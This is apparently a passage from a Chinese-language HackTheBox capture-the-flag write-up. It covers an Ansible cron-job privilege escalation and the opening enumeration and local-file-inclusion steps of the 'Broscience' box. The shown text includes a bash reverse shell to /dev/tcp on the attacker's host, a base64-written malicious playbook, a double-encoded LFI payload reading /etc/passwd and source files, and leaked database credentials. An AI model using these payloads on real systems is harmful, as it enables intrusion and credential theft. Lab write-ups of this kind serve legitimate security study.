<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.16.8/pspy64 -o /tmp/pspy64</span><br><span class="line">chmod +x /tmp/pspy64</span><br><span class="line">/tmp/pspy64</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3720   | sleep 10 </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3718   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ansible-parallel &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3717   | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ansible-parallel &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;*.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3716   | &#x2F;bin&#x2F;sh -c sleep 10 &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;rm -rf &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;* &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;cp &#x2F;root&#x2F;playbook_1.yml &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F; </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3715   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3714   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3722   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:02 CMD: UID&#x3D;0     PID&#x3D;3732   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:02 CMD: UID&#x3D;0     PID&#x3D;3728   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:02 CMD: UID&#x3D;0     PID&#x3D;3733   | &#x2F;lib&#x2F;systemd&#x2F;systemd-udevd </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3748   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3747   | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py &amp;&amp; sleep 0 </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3746   | &#x2F;bin&#x2F;sh -c &#x2F;bin&#x2F;sh -c &#39;&#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py &amp;&amp; sleep 0&#39; </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3751   | &#x2F;usr&#x2F;bin&#x2F;python3 -Es &#x2F;usr&#x2F;bin&#x2F;lsb_release -a </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3755   | &#x2F;usr&#x2F;bin&#x2F;python3 -Es &#x2F;usr&#x2F;bin&#x2F;lsb_release -a </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3759   | &#x2F;usr&#x2F;bin&#x2F;lspci -D </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3771   | &#x2F;sbin&#x2F;vgs --noheadings --nosuffix --units g --separator , </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3773   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3799   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3818   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329084.3736737-3799-18648848213699&#x2F;AnsiballZ_systemd.py </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3817   | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329084.3736737-3799-18648848213699&#x2F;AnsiballZ_systemd.py &amp;&amp; sleep 0 </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3816   | &#x2F;bin&#x2F;sh -c &#x2F;bin&#x2F;sh -c &#39;&#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329084.3736737-3799-18648848213699&#x2F;AnsiballZ_systemd.py &amp;&amp; sleep 0&#39; </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:05 CMD: UID&#x3D;0     PID&#x3D;3820   | &#x2F;usr&#x2F;bin&#x2F;systemctl show webapp</span><br></pre></td></tr></table></figure>
<p>这里只能ctrl+c退掉shell然后再弄个shell</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/</a></p>
</blockquote>
<p>构造BFL.yml如下</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">RShell</span></span><br><span class="line">      <span class="attr">command:</span> <span class="string">bash</span> <span class="string">/tmp/BFL_root</span></span><br></pre></td></tr></table></figure>
<p>写入至<code>/opt/automation/tasks/BFL.yml</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;LSBob3N0czogbG9jYWxob3N0CiAgdGFza3M6CiAgICAtIG5hbWU6IFJTaGVsbAogICAgICBjb21tYW5kOiBiYXNoIC90bXAvQkZMX3Jvb3Q=&quot;</span> | base64 -d &gt; /opt/automation/tasks/BFL.yml</span><br></pre></td></tr></table></figure>
<p>构造触发目标反弹Shell命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.*.*/9997 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL_root</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>获取bash脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.*.*/BFL_root -o /tmp/BFL_root</span><br></pre></td></tr></table></figure>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure>
<p>计划任务<code>/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</code>触发<code>/opt/automation/tasks/BFL.yml</code>再触发<code>/tmp/BFL_root</code>实现反弹Shell</p>
<p>查看root.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7b326b1361a10a45872887e9aaf6352b</span><br></pre></td></tr></table></figure>
<hr />
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh phil@10.10.11.204</span><br><span class="line">phil@10.10.11.204<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">DenyUsers phil</span><br></pre></td></tr></table></figure>
<p>嗯</p>
<hr />
<h1 id="hackthebox_broscience"><a class="markdownIt-Anchor" href="#hackthebox_broscience"></a> HackTheBox_Broscience</h1>
<h2 id="信息收集-12"><a class="markdownIt-Anchor" href="#信息收集-12"></a> 信息收集</h2>
<h3 id="端口扫描-29"><a class="markdownIt-Anchor" href="#端口扫描-29"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.195</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.195</span><br><span class="line">Host is up (0.60s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT	STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh	  OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp  open  http	 Apache httpd 2.4.54</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;http Apache httpd 2.4.54 ((Debian))</span><br><span class="line">Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h3 id="路径枚举-8"><a class="markdownIt-Anchor" href="#路径枚举-8"></a> 路径枚举</h3>
<p>查看域名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.195</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Date: Thu, 23 Mar 2023 11:11:56 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.54 (Debian)</span><br><span class="line">Location: https:&#x2F;&#x2F;broscience.htb&#x2F;</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br></pre></td></tr></table></figure>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.195\tbroscience.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>枚举路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://broscience.htb/</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;images&#x2F;																	   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;includes&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;manual&#x2F;</span><br></pre></td></tr></table></figure>
<p>枚举PHP文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://broscience.htb/ -X .php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;activate.php (CODE:200|SIZE:1256)														  </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;comment.php (CODE:302|SIZE:13)															 </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;index.php (CODE:200|SIZE:9304)															 </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;login.php (CODE:200|SIZE:1936)															 </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;logout.php (CODE:302|SIZE:0)															   </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;register.php (CODE:200|SIZE:2161)														  </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;user.php (CODE:200|SIZE:1309)</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-27"><a class="markdownIt-Anchor" href="#漏洞利用-27"></a> 漏洞利用</h2>
<p>访问主页，存在链接<code>https://broscience.htb/includes/img.php?path=bench.png</code></p>
<p>构造LFI</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd&#x27;</span> --insecure </span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:103:109:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:104:110::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:105:111:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:106:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rtkit:x:107:115:RealtimeKit,,,:&#x2F;proc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:108:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">avahi:x:110:116:Avahi mDNS daemon,,,:&#x2F;run&#x2F;avahi-daemon:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">speech-dispatcher:x:111:29:Speech Dispatcher,,,:&#x2F;run&#x2F;speech-dispatcher:&#x2F;bin&#x2F;false</span><br><span class="line">pulse:x:112:118:PulseAudio daemon,,,:&#x2F;run&#x2F;pulse:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">saned:x:113:121::&#x2F;var&#x2F;lib&#x2F;saned:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">colord:x:114:122:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">geoclue:x:115:123::&#x2F;var&#x2F;lib&#x2F;geoclue:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">Debian-gdm:x:116:124:Gnome Display Manager:&#x2F;var&#x2F;lib&#x2F;gdm3:&#x2F;bin&#x2F;false</span><br><span class="line">bill:x:1000:1000:bill,,,:&#x2F;home&#x2F;bill:&#x2F;bin&#x2F;bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">postgres:x:117:125:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
<p>查看<code>broscience.htb/includes/img.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/img.php&#x27;</span> --insecure </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;&lt;b&gt;Error:&lt;/b&gt; Missing \&#x27;path\&#x27; parameter.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for LFI attacks</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$badwords</span> = <span class="keyword">array</span>(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;etc/passwd&quot;</span>, <span class="string">&quot;.ssh&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$badwords</span> <span class="keyword">as</span> <span class="variable">$badword</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (strpos(<span class="variable">$path</span>, <span class="variable">$badword</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;&lt;b&gt;Error:&lt;/b&gt; Attack detected.&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Normalize path</span></span><br><span class="line"><span class="variable">$path</span> = urldecode(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the image</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: image/png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/images/&#x27;</span> . <span class="variable">$path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>查看<code>broscience.htb/includes/</code>路径下文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/&#x27;</span> --insecure </span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db_connect.php</span><br><span class="line">header.php</span><br><span class="line">img.php</span><br><span class="line">navbar.php</span><br><span class="line">utils.php</span><br></pre></td></tr></table></figure>
<p>查看<code>broscience.htb/includes/db_connect.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/db_connect.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$db_port</span> = <span class="string">&quot;5432&quot;</span>;</span><br><span class="line"><span class="variable">$db_name</span> = <span class="string">&quot;broscience&quot;</span>;</span><br><span class="line"><span class="variable">$db_user</span> = <span class="string">&quot;dbuser&quot;</span>;</span><br><span class="line"><span class="variable">$db_pass</span> = <span class="string">&quot;RangeOfMotion%777&quot;</span>;</span><br><span class="line"><span class="variable">$db_salt</span> = <span class="string">&quot;NaCl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_conn</span> = pg_connect(<span class="string">&quot;host=<span class="subst">&#123;$db_host&#125;</span> port=<span class="subst">&#123;$db_port&#125;</span> dbname=<span class="subst">&#123;$db_name&#125;</span> user=<span class="subst">&#123;$db_user&#125;</span> password=<span class="subst">&#123;$db_pass&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$db_conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到postgresql数据库登陆凭证</p>
<p>查看<code>broscience.htb/register.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fregister.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$activation_code</span> = generate_activation_code();</span><br><span class="line"><span class="variable">$activation_link</span> = <span class="string">&quot;https://broscience.htb/activate.php?code=<span class="subst">&#123;$activation_code&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = pg_execute(<span class="variable">$db_conn</span>, <span class="string">&quot;create_user_query&quot;</span>, <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], md5(<span class="variable">$db_salt</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]), <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>], <span class="variable">$activation_code</span>));</span><br></pre></td></tr></table></figure>
<p>得到账户激活码生成函数名，激活码参数，以及用户创建语句</p>
<p>查看<code>broscience.htb/includes/utils.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/utils.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
